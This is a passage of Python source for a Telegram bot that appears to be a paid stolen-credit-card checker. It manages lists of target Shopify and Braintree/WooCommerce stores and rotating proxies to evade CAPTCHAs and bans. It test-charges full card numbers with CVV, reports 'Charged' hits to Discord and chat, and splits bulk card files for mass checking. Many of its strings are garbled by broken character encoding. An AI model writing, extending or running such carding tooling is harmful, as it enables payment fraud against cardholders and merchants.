        text = "<b>ÃªÅ“Â±ÃŠÅ“Ã‰ÂªÃŠâ‚¬Ã¡Â´Â ÃªÅ“Â±ÃŠÂÃªÅ“Â±Ã¡Â´â€ºÃ¡Â´â€¡Ã¡Â´Â</b>\n\nÃªÅ“Â±Ã¡Â´â€¡ÃŠÅ¸Ã¡Â´â€¡Ã¡Â´â€žÃ¡Â´â€º Ã¡Â´â‚¬Ã‰Â´ Ã¡Â´ÂÃ¡Â´ËœÃ¡Â´â€ºÃ‰ÂªÃ¡Â´ÂÃ‰Â´ ÃŠâ„¢Ã¡Â´â€¡ÃŠÅ¸Ã¡Â´ÂÃ¡Â´Â¡"
        kb = _main_menu_kb_with_register(uid)
        _safe_edit_menu(cid, mid, text, kb, content_type)
    # Remove site
    elif data.startswith("rs_"):
        # Remove All Sites Ã¢â‚¬â€ confirmation prompt
        if data == "rs_all_confirm":
            sites = get_sites(cid)
            count = len(sites) if sites else 0
            if count == 0:
                bot.answer_callback_query(callback.id, "No sites to remove.", show_alert=True)
                return
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.row(
                types.InlineKeyboardButton(f"Ã¢Å“â€¦ Yes, remove all {count}", callback_data="rs_all_yes"),
                types.InlineKeyboardButton("Ã¢ÂÅ’ Cancel", callback_data="menu_sitelist"),
            )
            _safe_edit_menu(cid, mid, f"Ã¢Å¡Â Ã¯Â¸Â <b>Remove ALL {count} sites?</b>\n\nThis cannot be undone.", kb, content_type)
            return
        # Remove All Sites Ã¢â‚¬â€ confirmed
        if data == "rs_all_yes":
            sites = get_sites(cid)
            count = len(sites) if sites else 0
            set_sites(cid, [])
            text = f"Ã°Å¸Å’Â <b>Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nÃ¢Å“â€¦ Removed all {count} site(s)."
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
            _safe_edit_menu(cid, mid, text, kb, content_type)
            return
        # Remove single site by index
        try:
            idx = int(data[3:])
            if remove_site(cid, idx):
                text, kb = _sites_list_message(cid, with_remove_buttons=True)
                if not kb:
                    kb = types.InlineKeyboardMarkup()
                    kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
                _safe_edit_menu(cid, mid, text or "Ã°Å¸Å’Â <b>Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo sites left.", kb, content_type)
            else:
                pass  # already answered at top
        except (ValueError, IndexError):
            pass  # already answered at top
    # Remove BT site
    elif data.startswith("rbs_"):
        if data == "rbs_all_confirm":
            bsites = get_bt_sites(cid)
            count = len(bsites) if bsites else 0
            if count == 0:
                bot.answer_callback_query(callback.id, "No BT sites to remove.", show_alert=True)
                return
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.row(
                types.InlineKeyboardButton(f"Ã¢Å“â€¦ Yes, remove all {count}", callback_data="rbs_all_yes"),
                types.InlineKeyboardButton("Ã¢ÂÅ’ Cancel", callback_data="menu_toolbox"),
            )
            _safe_edit_menu(cid, mid, f"Ã¢Å¡Â Ã¯Â¸Â <b>Remove ALL {count} BT sites?</b>\n\nThis cannot be undone.", kb, content_type)
            return
        if data == "rbs_all_yes":
            bsites = get_bt_sites(cid)
            count = len(bsites) if bsites else 0
            set_bt_sites(cid, [])
            text = f"Ã°Å¸â€Â· <b>BT Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nÃ¢Å“â€¦ Removed all {count} BT site(s)."
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
            _safe_edit_menu(cid, mid, text, kb, content_type)
            return
        try:
            idx = int(data[4:])
            if remove_bt_site(cid, idx):
                text, kb = _bt_sites_list_message(cid, with_remove_buttons=True)
                if not kb:
                    kb = types.InlineKeyboardMarkup()
                    kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
                _safe_edit_menu(cid, mid, text or "Ã°Å¸â€Â· <b>BT Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo BT sites left.", kb, content_type)
            else:
                pass
        except (ValueError, IndexError):
            pass
    # Remove proxy
    elif data.startswith("rp_"):
        # Remove All Proxies Ã¢â‚¬â€ confirmation prompt
        if data == "rp_all_confirm":
            proxies = get_proxies(cid)
            count = len(proxies) if proxies else 0
            if count == 0:
                bot.answer_callback_query(callback.id, "No proxies to remove.", show_alert=True)
                return
            kb = types.InlineKeyboardMarkup(row_width=2)
            kb.row(
                types.InlineKeyboardButton(f"Ã¢Å“â€¦ Yes, remove all {count}", callback_data="rp_all_yes"),
                types.InlineKeyboardButton("Ã¢ÂÅ’ Cancel", callback_data="menu_proxylist"),
            )
            _safe_edit_menu(cid, mid, f"Ã¢Å¡Â Ã¯Â¸Â <b>Remove ALL {count} proxies?</b>\n\nThis cannot be undone.", kb, content_type)
            return
        # Remove All Proxies Ã¢â‚¬â€ confirmed
        if data == "rp_all_yes":
            proxies = get_proxies(cid)
            count = len(proxies) if proxies else 0
            set_proxies(cid, [])
            text = f"Ã°Å¸â€â€ž <b>Proxies</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nÃ¢Å“â€¦ Removed all {count} proxy(ies)."
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
            _safe_edit_menu(cid, mid, text, kb, content_type)
            return
        # Remove single proxy by index
        try:
            idx = int(data[3:])
            if remove_proxy(cid, idx):
                text, kb = _proxies_list_message(cid, with_remove_buttons=True)
                if not kb:
                    kb = types.InlineKeyboardMarkup()
                    kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
                _safe_edit_menu(cid, mid, text or "Ã°Å¸â€â€ž <b>Proxies</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo proxies left.", kb, content_type)
            else:
                pass  # already answered at top
        except (ValueError, IndexError):
            pass  # already answered at top
    # Menu: show sitelist / proxylist
    elif data == "menu_sitelist":
        text, kb = _sites_list_message(cid, with_remove_buttons=True)
        if not kb:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
        _safe_edit_menu(cid, mid, text or "Ã°Å¸Å’Â <b>Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo sites added yet.", kb, content_type)
    elif data == "menu_proxylist":
        text, kb = _proxies_list_message(cid, with_remove_buttons=True)
        if not kb:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
        _safe_edit_menu(cid, mid, text or "Ã°Å¸â€â€ž <b>Proxies</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo proxies added yet.", kb, content_type)
    elif data == "menu_setsite":
        pending_sites[cid] = time.time()
        bot.send_message(cid, "Ã°Å¸Å’Â Send site URLs (one per line).\n\nExample:\n<code>https://store1.com</code>", parse_mode="HTML")
    elif data == "menu_setproxies":
        pending_proxies[cid] = time.time()
        bot.send_message(cid, "Send proxies (one per line): <code>host:port:user:pass</code>", parse_mode="HTML")
    elif data == "menu_checkproxy":
        proxies = get_proxies(cid)
        kb_back = types.InlineKeyboardMarkup()
        kb_back.add(types.InlineKeyboardButton("Ã¢â€ Â Back", callback_data="menu_toolbox"))
        if not proxies:
            _safe_edit_menu(cid, mid, "No proxies. <code>/setproxies</code> to add.", kb_back, content_type)
        else:
            _safe_edit_menu(cid, mid, "Testing proxiesÃ¢â‚¬Â¦", kb_back, content_type)
            results = []
            ok = [0]
            _res_lock = threading.Lock()

            def _test_one_menu(i_proxy):
                i, proxy_url = i_proxy
                try:
                    with httpx.Client(proxy=proxy_url, timeout=10.0) as client:
                        r = client.get("https://api.ipify.org?format=json")
                        if r.status_code == 200:
                            with _res_lock:
                                ok[0] += 1
                                results.append((i, f"  Ã¢Å“â€¦ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ OK"))
                        else:
                            with _res_lock:
                                results.append((i, f"  Ã¢ÂÅ’ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ HTTP {r.status_code}"))
                except Exception as e:
                    with _res_lock:
                        results.append((i, f"  Ã¢ÂÅ’ {i+1}. {_proxy_display_name(proxy_url)} Ã¢â‚¬â€œ {str(e)[:30]}"))

            workers = min(5, len(proxies))
            with ThreadPoolExecutor(max_workers=workers, thread_name_prefix="mchkp") as pool:
                pool.map(_test_one_menu, enumerate(proxies))

            results.sort(key=lambda x: x[0])
            result_lines = [r[1] for r in results]
            summary = f"<b>Proxies</b> {ok[0]}/{len(proxies)} OK\n" + "\n".join(result_lines[:15])
            if len(result_lines) > 15:
                summary += f"\n  ... and {len(result_lines)-15} more"
            _safe_edit_menu(cid, mid, summary, kb_back, content_type)
    elif data == "menu_btsetsite":
        pending_bt_sites[cid] = time.time()
        bot.send_message(cid, "Ã°Å¸â€Â· Send Braintree/WooCommerce site URLs (one per line).\n\nExample:\n<code>https://store1.com</code>", parse_mode="HTML")
    elif data == "menu_btsitelist":
        text, kb = _bt_sites_list_message(cid, with_remove_buttons=True)
        if not kb:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â Back", callback_data="menu_toolbox"))
        _safe_edit_menu(cid, mid, text or "Ã°Å¸â€Â· <b>BT Sites</b>\nÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€ÂÃ¢â€Â\n\nNo BT sites added yet.", kb, content_type)
    elif data == "menu_utils":
        sc = _to_bold_sans
        text = (
            "Ã°Å¸â€ºÂ  <b>" + sc("Utilities") + "</b>\n\n"
            "Ã°Å¸â€Â <b>" + sc("BIN Lookup") + "</b>\n"
            "<code>/bin</code> " + sc("xxxxxx Ã¢â‚¬â€ check card BIN info") + "\n\n"
            "Ã°Å¸â€œÅ“ <b>" + sc("History") + "</b>\n"
            "<code>/history</code> " + sc("Ã¢â‚¬â€ last 10 check results") + "\n\n"
            "Ã¢Å“â€šÃ¯Â¸Â <b>" + sc("Split TXT") + "</b>\n"
            "<code>/splittxt</code> " + sc("Ã¢â‚¬â€ split card file into chunks") + "\n\n"
            "Ã°Å¸â€ºâ€˜ <b>" + sc("Stop") + "</b>\n"
            "<code>/stop</code> " + sc("Ã¢â‚¬â€ stop running mass check") + "\n"
        )
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Ã¢Â¬â€¦Ã¯Â¸Â " + sc("Back"), callback_data="menu_back"))
        _safe_edit_menu(cid, mid, text, kb, content_type)
    else:
        pass  # already answered at top


@bot.message_handler(commands=["splittxt"])
@_crash_safe
def cmd_splittxt(message):
    """Split a .txt card file into smaller chunks.
    Usage: reply to a .txt file with /splittxt 500"""
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _log_cmd(message, "/splittxt")
    if not uid or not is_registered(uid):
        bot.reply_to(message, "Register first. Use /register.", parse_mode="HTML")
        return

    text = (message.text or "").strip()
    parts = text.split()
    # Parse chunk size
    chunk_size = None
    if len(parts) >= 2:
        try:
            chunk_size = int(parts[1])
        except ValueError:
            pass
    if not chunk_size or chunk_size < 1:
        bot.reply_to(message, "Usage: Reply to a <b>.txt</b> file with:\n<code>/splittxt 500</code>\n\nThis splits the file into chunks of 500 cards each.", parse_mode="HTML")
        return

    # Must be a reply to a document
    reply = message.reply_to_message
    if not reply or not reply.document:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â Reply to a <b>.txt file</b> with this command.\n\nExample: send a .txt file, then reply to it with <code>/splittxt 500</code>", parse_mode="HTML")
        return

    # Download the file
    try:
        file_id = reply.document.file_id
        f = bot.get_file(file_id)
        data = bot.download_file(f.file_path)
        try:
            file_text = data.decode("utf-8", errors="ignore")
        except Exception:
            file_text = data.decode("latin-1", errors="ignore")
    except Exception as e:
        bot.reply_to(message, f"Ã¢ÂÅ’ Failed to download file: {str(e)[:100]}")
        return

    # Parse lines (keep all non-empty lines, cards are lines with |)
    all_lines = [line.strip() for line in file_text.splitlines() if line.strip()]
    if not all_lines:
        bot.reply_to(message, "Ã¢ÂÅ’ File is empty.")
        return

    total = len(all_lines)
    num_chunks = (total + chunk_size - 1) // chunk_size  # ceiling division

    status = bot.reply_to(message, f"Ã¢Å“â€šÃ¯Â¸Â Splitting <b>{total}</b> lines into chunks of <b>{chunk_size}</b> ({num_chunks} file{'s' if num_chunks > 1 else ''})...", parse_mode="HTML")

    for i in range(num_chunks):
        start = i * chunk_size
        end = min(start + chunk_size, total)
        chunk_lines = all_lines[start:end]
        chunk_text = "\n".join(chunk_lines)
        buf = io.BytesIO(chunk_text.encode("utf-8"))
        buf.name = f"cards_part{i+1}_of_{num_chunks}.txt"
        try:
            bot.send_document(cid, buf, caption=f"Ã°Å¸â€œâ€ž Part {i+1}/{num_chunks} Ã¢â‚¬â€ {len(chunk_lines)} cards")
        except Exception:
            pass
        if num_chunks > 3:
            time.sleep(0.3)  # rate limit for many files

    try:
        bot.edit_message_text(f"Ã¢Å“â€¦ Split <b>{total}</b> cards into <b>{num_chunks}</b> file{'s' if num_chunks > 1 else ''} of {chunk_size} each.", cid, status.message_id, parse_mode="HTML")
    except Exception:
        pass


@bot.message_handler(commands=["bin"])
@_crash_safe
def cmd_bin(message):
    """Lookup BIN information."""
    _log_cmd(message, "/bin")
    uid = getattr(message.from_user, "id", None)
    if uid and not is_registered(uid):
        bot.reply_to(message, "Please /start first.")
        return
    text = (message.text or "").strip()
    parts = text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: /bin <card_number or first 6 digits>")
        return
    card_input = parts[1].split("|")[0].strip()
    if not card_input.isdigit() or len(card_input) < 6:
        bot.reply_to(message, "Ã¢ÂÅ’ Provide at least 6 digits.")
        return
    info = _lookup_bin(card_input)
    if not info:
        bot.reply_to(message, "Ã¢ÂÅ’ BIN not found or API unavailable.")
        return
    msg = (
        f"Ã°Å¸â€™Â³ BIN Info: <code>{card_input[:6]}xxxx</code>\n\n"
        f"Ã°Å¸ÂÂ¦ Bank: {_esc(info['bank'])}\n"
        f"Ã°Å¸â€™Å½ Type: {_esc(info['type'])} | {_esc(info['scheme'])}\n"
        f"{info['emoji']} Country: {_esc(info['country_name'])} ({info['country']})"
    )
    if info.get('brand'):
        msg += f"\nÃ°Å¸ÂÂ· Brand: {_esc(info['brand'])}"
    bot.reply_to(message, msg, parse_mode="HTML")


@bot.message_handler(commands=["history"])
@_crash_safe
def cmd_history(message):
    """View recent check history."""
    _log_cmd(message, "/history")
    uid = getattr(message.from_user, "id", None)
    if uid and not is_registered(uid):
        bot.reply_to(message, "Please /start first.")
        return
    db, _ = _get_mongo()
    if db is None:
        bot.reply_to(message, "Ã¢ÂÅ’ Database not connected.")
        return
    history_coll = db["check_history"]
    results = list(history_coll.find({"user_id": uid}).sort("timestamp", -1).limit(10))
    if not results:
        bot.reply_to(message, "No check history found.")
        return
    lines = ["Ã°Å¸â€œâ€¹ <b>Recent Checks</b>\n"]
    for r in results:
        status = r.get("status", "?")
        emoji = "Ã¢Å“â€¦" if status in ("Charged", "Approved") else "Ã¢ÂÅ’" if status == "Declined" else "Ã¢Å¡Â Ã¯Â¸Â"
        card = r.get("card_last4", "????")
        gw = r.get("gateway", "?")
        msg_text = (r.get("message") or "")[:40]
        ts = r.get("timestamp")
        time_str = ts.strftime("%m/%d %H:%M") if ts else "?"
        lines.append(f"{emoji} <code>****{card}</code> | {gw} | {_esc(msg_text)} | {time_str}")
    bot.reply_to(message, "\n".join(lines), parse_mode="HTML")


@bot.message_handler(commands=["stop"])
@_crash_safe
def cmd_stop(message):
    """Stop any running /sh or /msh check in this chat."""
    cid = message.chat.id
    _log_cmd(message, "/stop")
    _stop_flags[cid] = True
    bot.reply_to(message, "Ã°Å¸â€ºâ€˜ " + _to_bold_sans("STOPPING CHECKS") + "Ã¢â‚¬Â¦ remaining cards will be skipped and credits refunded.", parse_mode="HTML")


@bot.message_handler(func=lambda m: m.text and m.text.strip().lower().startswith("/sh "))
@_crash_safe
def cmd_sh(message):
    start_time = time.time()
    
    cid = message.chat.id
    uid = getattr(message.from_user, "id", None)
    _stop_flags.pop(cid, None)  # clear any previous stop flag
    _log_cmd(message, "/sh", extra=(message.text or "").strip())
    _udata = _get_cached_user_data(uid) if uid else None
    if not uid or _udata is None:
        bot.reply_to(message, "Register first to use the bot. Use /register or press Register on /start.", parse_mode="HTML")
        return
    update_user_activity(uid, username=getattr(message.from_user, 'username', None), first_name=getattr(message.from_user, 'first_name', None))
    _is_owner = (uid in OWNER_IDS)
    _has_plan = _user_has_active_plan(uid)
    if not _is_owner and not _has_plan:
        cred = _udata.get("credits", 0)
        if cred is None or cred < CREDITS_PER_CHECK:
            bot.reply_to(message, "Insufficient credits. You need 1 credit per check.", parse_mode="HTML")
            return
    text = (message.text or "").strip()
    rest = text.replace("/sh", "").strip()
    if not rest:
        bot.reply_to(message, "Use: /sh cc|mm|yy|cvv")
        return
    # Normalize separators: accept | / : space
    rest_clean = rest.replace(" ", "").replace("/", "|").replace(":", "|")
    parts = rest_clean.split("|")
    if len(parts) != 4:
        bot.reply_to(message, "Invalid format. Use: cc|mm|yy|cvv")
        return
    cc_num, mm, yy, cvv = [p.strip() for p in parts]
    if not _re.fullmatch(r'\d{13,19}', cc_num):
        bot.reply_to(message, "Invalid card number (must be 13-19 digits).")
        return
    if not _re.fullmatch(r'(0[1-9]|1[0-2])', mm):
        bot.reply_to(message, "Invalid month (01-12).")
        return
    if not _re.fullmatch(r'\d{2,4}', yy):
        bot.reply_to(message, "Invalid year (2 or 4 digits).")
        return
    if not _re.fullmatch(r'\d{3,4}', cvv):
        bot.reply_to(message, "Invalid CVV (3-4 digits).")
        return
    # Luhn pre-validation Ã¢â‚¬â€ reject invalid cards before deducting credits
    card_str = "|".join([cc_num, mm, yy, cvv])
    valid, err = _validate_card_format(card_str)
    if not valid:
        bot.reply_to(message, f"Ã¢ÂÅ’ {err}\nNo credits deducted.")
        return
    sites = get_sites(cid)
    proxies = get_proxies(cid)
    # Fallback: if group chat has no sites/proxies, try user's DM settings
    if uid and cid != uid:
        if not sites:
            sites = get_sites(uid)
        if not proxies:
            proxies = get_proxies(uid)
    if not sites:
        bot.reply_to(message, "No sites. <code>/setsite</code> to add.", parse_mode="HTML")
        return
    if not proxies:
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â <b>Proxies required.</b> Add proxies first using <code>/setproxies</code> to avoid CAPTCHA and bans.", parse_mode="HTML")
        return
    if not _is_owner and not _has_plan:
        if not deduct_credits(uid, CREDITS_PER_CHECK):
            bot.reply_to(message, "Insufficient credits.")
            return
    site = _pick_site_rr(sites)
    proxy = _pick_proxy(proxies)  # Rotate proxy for each check
    card_str = "|".join(parts)
    # Anti-duplicate check (owner bypassed)
    if not _is_owner and not _has_plan and _is_duplicate_card(card_str):
        bot.reply_to(message, "Ã¢Å¡Â Ã¯Â¸Â This card was already checked in the last 5 minutes. Skipped (no credits deducted).")
        # Refund the credit
        coll = _users_coll()
        if coll is not None:
            coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
            _invalidate_user_cache(uid)
        return
    status_msg = bot.reply_to(message, "Ã¢ÂÂ³ " + _to_bold_sans("CHECKING CARD..."), parse_mode="HTML")
    try:
        result = run_check_sync(site, card_str, proxy)
        _record_proxy_result(proxy, result)
        _record_site_result(site, result)
    except Exception as e:
        err_text = str(e)[:300]
        if DEBUG:
            print(f"[Shiro] /sh exception -> {err_text}")
        bot.edit_message_text(f"Ã¢ÂÅ’ Error: {err_text}", cid, status_msg.message_id)
        # Refund credit on exception (only if not plan user)
        if not _has_plan:
            coll = _users_coll()
            if coll is not None:
                coll.update_one({"_id": uid}, {"$inc": {"credits": CREDITS_PER_CHECK}})
                _invalidate_user_cache(uid)
        return
    
    elapsed = time.time() - start_time
    status = result.get("status", "Error")
    
    # MongoDB update
    _mongo_inc = {"total_checks": 1}
    if status == "Error" and not _is_owner and not _has_plan:
        _mongo_inc["credits"] = CREDITS_PER_CHECK  # refund
    coll = _users_coll()
    if coll is not None:
        coll.update_one({"_id": uid}, {"$inc": _mongo_inc})
        _invalidate_user_cache(uid)
    msg = result.get("message", "")
    code = result.get("error_code", "")
    gw_msg = result.get("gateway_message", "")
    product = result.get("product", "")
    price = result.get("price", "")
    site_short = site.replace("https://", "").replace("http://", "").split("/")[0]

    # Hit notifications (keep these working)
    if status == "Charged":
        try:
            _discord_charged(message, card_str, _esc(site_short), _esc(product), _esc(price), "single", status="Charged", response="CARD CHARGED")
        except Exception:
            pass
        try:
            _send_hit_to_chat(message, "ORDER_PLACED", _esc(price), _esc(product), response="CARD CHARGED")
        except Exception:
            pass
        increment_total_hits(uid, 1)
    elif status == "Approved":
        pass  # No hit notification for Approved
        increment_total_hits(uid, 1)

    # Build response Ã¢â‚¬â€ real code from Shopify processingError
    if status == "Charged":
        _resp_text = "Order completed Ã°Å¸â€ºâ€™"
        _header = "<b>Ã°ÂËœÂ¾Ã°Ââ„¢Æ’Ã°ÂËœÂ¼Ã°Ââ„¢ÂÃ°Ââ„¢â€šÃ°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã°Å¸Â§Â¾"
    elif status == "Approved":
        _resp_text = _esc(code or msg or "Approved")
        _header = "<b>Ã°ÂËœÂ¼Ã°Ââ„¢â€¹Ã°Ââ„¢â€¹Ã°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢â€˜Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢Å“â€¦"
    elif status == "Declined":
        _resp_text = _esc(code or msg or "Declined")
        _header = "<b>Ã°ÂËœÂ¿Ã°Ââ„¢â‚¬Ã°ÂËœÂ¾Ã°Ââ„¢â€¡Ã°Ââ„¢â€žÃ°Ââ„¢â€°Ã°Ââ„¢â‚¬Ã°ÂËœÂ¿</b> Ã¢ÂÅ’"
    else:
        _resp_text = _esc(code or msg or status)
        _header = "<b>Ã°Ââ„¢â‚¬Ã°Ââ„¢ÂÃ°Ââ„¢ÂÃ°Ââ„¢Å Ã°Ââ„¢Â</b> Ã¢Å¡Â Ã¯Â¸Â"

    cc_num = card_str.split("|")[0]
    out  = f"{_header}\n\n"
    out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”â€“</b> Ã¢â€¡Â¾ <code>{card_str}</code>\n"
    out += f"<b>Ã°Ââ€”Å¡Ã°Ââ€”Â®Ã°ÂËœÂÃ°Ââ€”Â²Ã°ÂËœâ€žÃ°Ââ€”Â®Ã°ÂËœâ€ </b> Ã¢â€¡Â¾ Shopify Payments\n"
    out += f"<b>Ã°Ââ€”Â¥Ã°Ââ€”Â²Ã°ÂËœâ‚¬Ã°Ââ€”Â½Ã°Ââ€”Â¼Ã°Ââ€”Â»Ã°ÂËœâ‚¬Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ {_resp_text}\n"
    out += f"<b>Ã°Ââ€”Â£Ã°Ââ€”Â¿Ã°Ââ€”Â¶Ã°Ââ€”Â°Ã°Ââ€”Â²</b> Ã¢â€¡Â¾ ${_esc(price)} Ã°Å¸â€™Â¸\n"
    if status == "Error" and not _is_owner and not _has_plan:
        out += f"<b>Ã°Ââ€”Â¡Ã°Ââ€”Â¼Ã°ÂËœÂÃ°Ââ€”Â²</b> Ã¢â€¡Â¾ Credit refunded Ã°Å¸â€™Â°\n"

    # BIN info
    try:
        bi = _lookup_bin(cc_num)
        if bi:
            out += f"\n<b>Ã°Ââ€”â€¢Ã°Ââ€”Å“Ã°Ââ€”Â¡ Ã°Ââ€”Å“Ã°Ââ€”Â»Ã°Ââ€”Â³Ã°Ââ€”Â¼:</b> {_esc(bi['scheme'])} - {_esc(bi['type'])} - {_esc(bi.get('brand') or bi['type'])}\n"
            out += f"<b>Ã°Ââ€”â€¢Ã°Ââ€”Â®Ã°Ââ€”Â»Ã°Ââ€”Â¸:</b> {_esc(bi['bank'])}\n"
            out += f"<b>Ã°Ââ€”â€“Ã°Ââ€”Â¼Ã°ÂËœâ€šÃ°Ââ€”Â»Ã°ÂËœÂÃ°Ââ€”Â¿Ã°ÂËœâ€ :</b> {_esc(bi['country_name'])} {bi['emoji']}\n"
    except Exception:
        pass

    # Time taken
    out += f"\n<b>Ã°Ââ€”Â§Ã°Ââ€”Â¶Ã°Ââ€”ÂºÃ°Ââ€”Â²</b> Ã¢â€¡Â¾ {elapsed:.1f}s Ã¢ÂÂ±Ã¯Â¸Â\n"

    
    bot.edit_message_text(out, cid, status_msg.message_id, parse_mode="HTML")
    _mark_card_checked(card_str)
    _bg_fire(_log_check_result, uid, cc_num[-4:], "Shopify", status, code or msg, site)


# Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
#  /st Ã¢â‚¬â€ Stripe Charge Single Card Check
